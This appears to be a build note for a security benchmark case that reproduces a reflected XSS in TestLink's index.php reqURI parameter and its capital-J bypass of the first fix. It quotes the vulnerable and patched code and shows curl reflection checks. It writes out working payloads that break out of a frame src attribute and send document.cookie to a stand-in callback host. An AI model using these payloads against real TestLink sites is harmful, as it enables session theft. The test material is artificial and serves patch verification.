WHAT CHANGED vs THE PRIOR BUILD (HARD POLICY compliance)
----------------------------------------------------------------------------------------
The prior build shipped a HAND-WRITTEN minimal repro (app.php + render.php) that re-implemented the
index.php::initEnv() reqURI check and the main.tpl sink, and served it small. That was a SOURCE-LIFT
(banned). It only "worked" because it faked `$_SESSION['basehref'] = ''` -- a fiction. This rebuild
runs the REAL published TestLink at the exact refs on Docker (PHP 7.4 + Apache + MariaDB 10.6),
seeds the REAL TestLink schema + default admin (admin/admin) from the cloned install SQL, and drives
the XSS with an EXTERNAL HTTP GET into the REAL index.php over the network. No source-lift.
Stale leftovers (NOT rm'd per directive; not referenced by compose/case.json): app.php, render.php,
BUILD_TODO.md, __pycache__/, _heldout/__pycache__/.

REAL SOURCE (git repo TestLinkOpenSourceTRMS/testlink-code, cloned at BUILD time)
----------------------------------------------------------------------------------------
Sink (REAL, per version -- the main-frame src in main.tpl, reflecting index.php::initEnv() reqURI):
  V0 tag 1.9.19 : gui/templates/tl-classic/main.tpl uses a <frameset> with
                  <frame src="{$gui->mainframe}" name="mainframe" ...>   (cf. ExploitDB 47702's
                  "<frame src=\"javascript:alert(0x002082)\">").
  V1/V2         : main.tpl uses <iframe src="{$gui->mainframe}" name="mainframe" class="siteContent">.
  Smarty does NOT escape {$gui->mainframe}; reqURI is reflected raw into the double-quoted src="...".

initEnv() reqURI handling (index.php), source-verified in the running containers:
  V0 = tag 1.9.19 :  $args->reqURI = ($pParams["reqURI"] != '') ? $pParams["reqURI"] : 'lib/general/mainPage.php';
       NO javascript guard, NO basehref prepend.
  V1 = commit e2bebf684 (parent of the CVE-2019-20381 fix; contains the CVE-2019-19491 fix
       commit 0e3e907990f40483c0cd850744bc995011826799, 2019-11-30, "SECURITY CWE-79 ...
       https://cxsecurity.com/issue/WLB-2019110139"):
         if (strpos($args->reqURI,'javascript') !== false) { $args->reqURI = null; }   <-- CASE-SENSITIVE
         $args->reqURI = $_SESSION['basehref'] . $args->reqURI;                        <-- basehref prepend
  V2 = commit cde692895e425731e6951d265a01ca6425a7c26e (tag 1.9.20, 2019-12-31,
       "fix: 0008808: TestLink v1.9.19.1 - Bypass security fix for XSS at index.php"):
         -  if (strpos($args->reqURI,'javascript') !== false) {
         +  if (stripos($args->reqURI,'javascript') !== false) {   <-- CASE-INSENSITIVE

AUTH NOTE (why the victim logs in): the reqURI reflection into main.tpl only renders for an
AUTHENTICATED session -- unauthenticated index.php redirects to login.php BEFORE main.tpl. This is an
authenticated reflected XSS (ExploitDB 47702's PoC carries PHPSESSID + TESTLINK_USER_AUTH_COOKIE).
The headless victim logs into the REAL TestLink (admin/admin), then visits the crafted reqURI URL.

EXECUTION VECTOR (why onload attribute-breakout, not a bare javascript: scheme)
----------------------------------------------------------------------------------------
Two REAL constraints make a bare `javascript:` reqURI scheme non-executing on the current stack:
  (1) modern Chromium blocks javascript: URLs in frame/iframe navigation; and
  (2) the V1 fix ALSO prepends $_SESSION['basehref'] (e.g. http://host/), so a bare `Javascript:...`
      reqURI reflects as `http://host/Javascript:...` -- a plain HTTP URL, not a scheme.
Because reqURI is reflected UNESCAPED into the double-quoted src="...", a single `"` closes the src
attribute and lets an `onload="..."` handler be appended to the SAME <frame>/<iframe> element. onload
fires when the frame loads (its src 404s harmlessly), is scheme-independent, basehref-proof, and works
identically on the V0 <frame> and the V1/V2 <iframe>. The differential is carried ENTIRELY by the
leading token `javascript` vs `Javascript` -- exactly the strpos->stripos case-sensitivity delta.

PAYLOADS (benign -- exfil the planted flag only; differ by EXACTLY ONE character: j -> J)
----------------------------------------------------------------------------------------
CB = //callback:9000/c?f=
original (CVE-2019-19491, lowercase): reqURI = javascript" onload="new Image().src='<CB>'+document.cookie
residual (CVE-2019-20381, capital J): reqURI = Javascript" onload="new Image().src='<CB>'+document.cookie
URL: index.php?caller=login&reqURI=<payload>&viewer=3   (faithful to ExploitDB 47702)

DIRECT-REFLECTION SANITY (curl, authenticated admin session, real TestLink)
----------------------------------------------------------------------------------------
V0  reqURI=javascript" onload="BEACON  ->  <frame src="javascript" onload="BEACON" ... name='mainframe' />   (reflected raw, onload injected)
V1  reqURI=javascript" onload="BEACON  ->  <iframe src="http://127.0.0.1:34521/lib/general/mainPage.php" ...> (BLOCKED: strpos nulled reqURI)
V1  reqURI=Javascript" onload="BEACON  ->  <iframe src="http://127.0.0.1:34521/Javascript" onload="BEACON" ...> (RESIDUAL reflected raw, onload injected)
V2  reqURI=Javascript" onload="BEACON  ->  <iframe src="http://127.0.0.1:34522/lib/general/mainPage.php" ...> (BLOCKED: stripos nulled reqURI)

